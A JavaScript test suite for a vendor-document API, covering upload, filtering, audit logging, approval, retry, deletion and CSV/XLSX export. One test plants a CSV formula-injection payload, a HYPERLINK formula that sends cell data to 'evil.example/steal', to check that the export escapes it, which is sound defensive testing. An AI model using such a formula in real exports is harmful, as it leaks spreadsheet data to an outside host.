import request from "supertest";
import { app } from "../src/app.js";
import { VendorDocument } from "../src/models/index.js";
import { authHeader, resetDb, signup } from "./testUtils.js";

beforeEach(resetDb);

async function makeDocument(orgId, overrides = {}) {
  return VendorDocument.create({
    orgId,
    originalFilename: "coi.pdf",
    storagePath: "/tmp/does-not-matter.pdf",
    contentType: "application/pdf",
    status: "extracted",
    vendorName: "Acme Contracting LLC",
    documentType: "Certificate of Insurance",
    amount: 1000000,
    overallConfidence: 0.95,
    ...overrides,
  });
}

async function orgId(token) {
  const res = await request(app).get("/api/auth/me").set(authHeader(token));
  return res.body.org_id;
}

function isoDateDaysFromNow(days) {
  const d = new Date();
  d.setUTCDate(d.getUTCDate() + days);
  return d.toISOString().slice(0, 10);
}

test("upload rejects unsupported file type", async () => {
  const token = await signup(app, request);
  const res = await request(app)
    .post("/api/vendor-documents/upload")
    .set(authHeader(token))
    .attach("file", Buffer.from("hello"), { filename: "notes.txt", contentType: "text/plain" });
  expect(res.status).toBe(422);
});

test("upload requires a file", async () => {
  const token = await signup(app, request);
  const res = await request(app).post("/api/vendor-documents/upload").set(authHeader(token));
  expect(res.status).toBe(422);
});

test("upload creates a queued document and lists it", async () => {
  const token = await signup(app, request);
  const res = await request(app)
    .post("/api/vendor-documents/upload")
    .set(authHeader(token))
    .attach("file", Buffer.from("%PDF-1.4 fake"), { filename: "coi.pdf", contentType: "application/pdf" });
  expect(res.status).toBe(201);
  expect(res.body.status).toBe("queued");

  const listRes = await request(app).get("/api/vendor-documents").set(authHeader(token));
  expect(listRes.status).toBe(200);
  expect(listRes.body.items.map((i) => i.id)).toContain(res.body.id);
  expect(listRes.body.document_types).toContain("W-9");
});

test("list can filter by status and search by vendor name", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeDocument(org, { status: "needs_review", vendorName: "Acme Insurance Brokers" });
  await makeDocument(org, { status: "approved", vendorName: "Beta Contracting" });

  const filtered = await request(app).get("/api/vendor-documents?status=approved").set(authHeader(token));
  expect(filtered.body.items).toHaveLength(1);
  expect(filtered.body.items[0].vendor_name).toBe("Beta Contracting");

  const searched = await request(app).get("/api/vendor-documents?q=acme").set(authHeader(token));
  expect(searched.body.items).toHaveLength(1);
  expect(searched.body.items[0].vendor_name).toBe("Acme Insurance Brokers");
});

describe("expiring_within_days filter", () => {
  test("includes a document expiring within the window and one already expired", async () => {
    const token = await signup(app, request);
    const org = await orgId(token);
    const soon = await makeDocument(org, { vendorName: "Expiring Soon Co", expirationDate: isoDateDaysFromNow(10) });
    const expired = await makeDocument(org, { vendorName: "Already Expired Co", expirationDate: isoDateDaysFromNow(-5) });

    const res = await request(app).get("/api/vendor-documents?expiring_within_days=30").set(authHeader(token));
    expect(res.status).toBe(200);
    const ids = res.body.items.map((i) => i.id);
    expect(ids).toEqual(expect.arrayContaining([soon.id, expired.id]));
  });

  test("excludes a document expiring outside the window", async () => {
    const token = await signup(app, request);
    const org = await orgId(token);
    await makeDocument(org, { vendorName: "Far Out Co", expirationDate: isoDateDaysFromNow(90) });

    const res = await request(app).get("/api/vendor-documents?expiring_within_days=30").set(authHeader(token));
    expect(res.body.items).toHaveLength(0);
  });

  test("excludes a document with no expiration date at all (e.g. a W-9)", async () => {
    const token = await signup(app, request);
    const org = await orgId(token);
    await makeDocument(org, { vendorName: "No Expiry Co", documentType: "W-9", expirationDate: null });

    const res = await request(app).get("/api/vendor-documents?expiring_within_days=30").set(authHeader(token));
    expect(res.body.items).toHaveLength(0);
  });
});

test("document correction writes audit log", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeDocument(org);

  let res = await request(app)
    .patch(`/api/vendor-documents/${doc.id}`)
    .set(authHeader(token))
    .send({ vendor_name: "Acme Corrected LLC" });
  expect(res.status).toBe(200);
  expect(res.body.vendor_name).toBe("Acme Corrected LLC");

  res = await request(app).get(`/api/vendor-documents/${doc.id}/audit-log`).set(authHeader(token));
  const actions = res.body.map((e) => e.action);
  expect(actions).toContain("human_correction");
});

test("correcting a field that doesn't actually change the value writes no audit log entry", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeDocument(org);

  await request(app)
    .patch(`/api/vendor-documents/${doc.id}`)
    .set(authHeader(token))
    .send({ vendor_name: doc.vendorName });

  const res = await request(app).get(`/api/vendor-documents/${doc.id}/audit-log`).set(authHeader(token));
  expect(res.body.map((e) => e.action)).not.toContain("human_correction");
});

test("approve document", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeDocument(org);

  const res = await request(app).post(`/api/vendor-documents/${doc.id}/approve`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.status).toBe("approved");
});

test("cannot approve a document still queued or processing", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeDocument(org, { status: "queued" });

  const res = await request(app).post(`/api/vendor-documents/${doc.id}/approve`).set(authHeader(token));
  expect(res.status).toBe(409);
});

test("reject document has no status restriction", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeDocument(org, { status: "approved" });

  const res = await request(app).post(`/api/vendor-documents/${doc.id}/reject`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.status).toBe("rejected");
});

test("retrying a failed document re-queues it and clears the error message", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeDocument(org, { status: "failed", errorMessage: "OCR failed: boom" });

  const res = await request(app).post(`/api/vendor-documents/${doc.id}/retry`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.status).toBe("queued");
  expect(res.body.error_message).toBe("");

  const auditRes = await request(app).get(`/api/vendor-documents/${doc.id}/audit-log`).set(authHeader(token));
  expect(auditRes.body.map((e) => e.action)).toContain("retry_requested");
});

test("cannot retry an already-approved document", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeDocument(org, { status: "approved" });

  const res = await request(app).post(`/api/vendor-documents/${doc.id}/retry`).set(authHeader(token));
  expect(res.status).toBe(409);

  await doc.reload();
  expect(doc.status).toBe("approved"); // untouched
});

test("deleting a document removes it from the list and detail views", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeDocument(org);

  const res = await request(app).delete(`/api/vendor-documents/${doc.id}`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.ok).toBe(true);

  const listRes = await request(app).get("/api/vendor-documents").set(authHeader(token));
  expect(listRes.body.items.map((i) => i.id)).not.toContain(doc.id);

  const detailRes = await request(app).get(`/api/vendor-documents/${doc.id}`).set(authHeader(token));
  expect(detailRes.status).toBe(404);
});

test("deleting a document is not blocked by its status -- e.g. an already-approved one", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeDocument(org, { status: "approved" });

  const res = await request(app).delete(`/api/vendor-documents/${doc.id}`).set(authHeader(token));
  expect(res.status).toBe(200);
});

test("deleting the same document twice, or one that never existed, 404s", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeDocument(org);

  await request(app).delete(`/api/vendor-documents/${doc.id}`).set(authHeader(token));
  const again = await request(app).delete(`/api/vendor-documents/${doc.id}`).set(authHeader(token));
  expect(again.status).toBe(404);

  const bogus = await request(app).delete("/api/vendor-documents/not-a-real-id").set(authHeader(token));
  expect(bogus.status).toBe(404);
});

test("export csv", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeDocument(org, { vendorName: "Acme Insurance Co" });

  const res = await request(app).get("/api/export/vendor-documents/csv").set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.text).toContain("Acme Insurance Co");
});

test("export csv neutralizes formula-injection payloads", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeDocument(org, { vendorName: '=HYPERLINK("http://evil.example/steal?x="&A1,"Click")' });

  const res = await request(app).get("/api/export/vendor-documents/csv").set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.text).toContain('"\'=HYPERLINK(');
  expect(res.text).not.toContain('"=HYPERLINK(');
});

test("export xlsx responds successfully", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeDocument(org);

  const res = await request(app).get("/api/export/vendor-documents/xlsx").set(authHeader(token));
  expect(res.status).toBe(200);
});
